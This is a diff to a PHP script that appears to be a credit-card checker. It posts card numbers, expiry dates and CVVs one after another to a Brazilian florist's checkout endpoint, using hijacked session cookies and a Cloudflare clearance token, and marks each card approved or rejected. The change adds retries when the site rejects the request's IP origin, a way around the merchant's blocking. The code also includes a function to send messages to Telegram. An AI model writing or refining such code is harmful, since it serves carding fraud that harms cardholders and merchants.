@@ -12,9 +12,9 @@ $headers = [
     "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
     "Accept: */*",
     "Origin: https://www.coroas24horas.com.br",
-    "Referer: https://www.coroas24horas.com.br/pedido-finalizado/299332-4.html",
+    "Referer: https://www.coroas24horas.com.br/pedido-finalizado/299351-4.html",
     "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6",
-    "Cookie: PHPSESSID=tjo09cc92i3a2lulkpugpskld1; clix.session=2783258907564146; _fb.2.1754114896512.897751804860810456; _GA1.1.525385210.1754114898; cf_clearance=QfvbI16gUTQat_suPL6E._RvEWUwy.r1iJUuRgxp2PU-1752904560-1.2.1.1-hLJU9vOd4mJmJr_Y0F7wZ5kFLuOi5x5t_6MKrZZIaZFkhiX08JPydcUYrrDaA4qSWcOZ2fc_hp_sDT72hU4EzY2.0gwLfTs73O5Z_PHBOt3l8rmMKMmO0L6Wna50oNb1O0jDjO.sFWRF2KSoNPnrtx5X5blXgtRBARf3pXvGb4wOgeikSEV57qAjzllphtO2q_LvWBw9mxodcIvHbysrcKTUeKFJJckA6geQyzMZDE8"
+    "Cookie: PHPSESSID=7invth9ehbchh2s3bovb6i7fp5; clix.session=9616977733319264; _fb.2.1754259260294.55017387201326841; _GA1.1.1084089472.1754265149; cf_clearance=QfvbI16gUTQat_suPL6E._RvEWUwy.r1iJUuRgxp2PU-1752904560-1.2.1.1-hLJU9vOd4mJmJr_Y0F7wZ5kFLuOi5x5t_6MKrZZIaZFkhiX08JPydcUYrrDaA4qSWcOZ2fc_hp_sDT72hU4EzY2.0gwLfTs73O5Z_PHBOt3l8rmMKMmO0L6Wna50oNb1O0jDjO.sFWRF2KSoNPnrtx5X5blXgtRBARf3pXvGb4wOgeikSEV57qAjzllphtO2q_LvWBw9mxodcIvHbysrcKTUeKFJJckA6geQyzMZDE8"
 ];
 
 // Função para enviar mensagem para o Telegram
@@ -66,35 +66,57 @@ foreach ($cartoes as $card) {
                    "1\r\n" .
                    "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                    "Content-Disposition: form-data; name=\"code\"\r\n\r\n" .
-                   "299332\r\n" .
+                   "299351\r\n" .
                    "------WebKitFormBoundaryOYLMQ49KUv5xEBBn--";
 
-        // Inicializa cURL
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Desativa verificação SSL
+        $max_attempts = 3;
+        $attempt = 0;
+        $success = false;
+        $response = '';
+        $tempo_resposta = 0;
 
-        // Executa a requisição
-        $start_time = microtime(true); // Inicia o cronômetro
-        $response = curl_exec($ch);
-        $resp_text = trim($response);
-        $end_time = microtime(true); // Para o cronômetro
+        while ($attempt < $max_attempts && !$success) {
+            $attempt++;
+            // Inicializa cURL
+            $ch = curl_init($url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+            curl_setopt($ch, CURLOPT_POST, true);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Desativa verificação SSL
 
-        // Calcula o tempo de resposta
-        $tempo_resposta = round($end_time - $start_time, 2);
+            // Executa a requisição
+            $start_time = microtime(true); // Inicia o cronômetro
+            $response = curl_exec($ch);
+            $resp_text = trim($response);
+            $end_time = microtime(true); // Para o cronômetro
 
-        // Verifica a resposta
-        $returnCode = ''; // Variável para armazenar o returnCode
-        $message = ''; // Variável para armazenar a mensagem
+            // Calcula o tempo de resposta
+            $tempo_resposta = round($end_time - $start_time, 2);
 
-        // Tenta decodificar a resposta JSON
-        $json_response = json_decode($resp_text, true);
-        if (isset($json_response['returnCode'])) {
-            $returnCode = $json_response['returnCode'];
-            $message = $json_response['message'] ?? 'Sem mensagem';
+            // Verifica a resposta
+            $returnCode = ''; // Variável para armazenar o returnCode
+            $message = ''; // Variável para armazenar a mensagem
+
+            // Tenta decodificar a resposta JSON
+            $json_response = json_decode($resp_text, true);
+            if (isset($json_response['returnCode'])) {
+                $returnCode = $json_response['returnCode'];
+                $message = $json_response['message'] ?? 'Sem mensagem';
+            } else {
+                $message = $resp_text; // Usa a resposta bruta se não for JSON
+            }
+
+            // Verifica se a resposta contém o erro de IP inválido
+            if (strpos($resp_text, 'PV with invalid ip origin') !== false && $attempt < $max_attempts) {
+                echo "<span class='badge badge-warning'>Tentativa $attempt/$max_attempts</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-warning'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » <br></b>";
+                curl_close($ch); // Fecha a conexão cURL
+                sleep(2); // Espera 2 segundos antes de tentar novamente
+                continue; // Tenta novamente
+            }
+
+            $success = true; // Sai do loop se não for o erro de IP ou se for a última tentativa
+            curl_close($ch); // Fecha a conexão cURL
         }
 
         // Formata a saída
@@ -117,7 +139,6 @@ foreach ($cartoes as $card) {
             echo "<span class='badge badge-danger'>Reprovada</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-danger'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » <br></b>";
         }
 
-        curl_close($ch); // Fecha a conexão cURL
         sleep(5); // Espera 5 segundos entre as requisições
 
     } catch (Exception $e) {
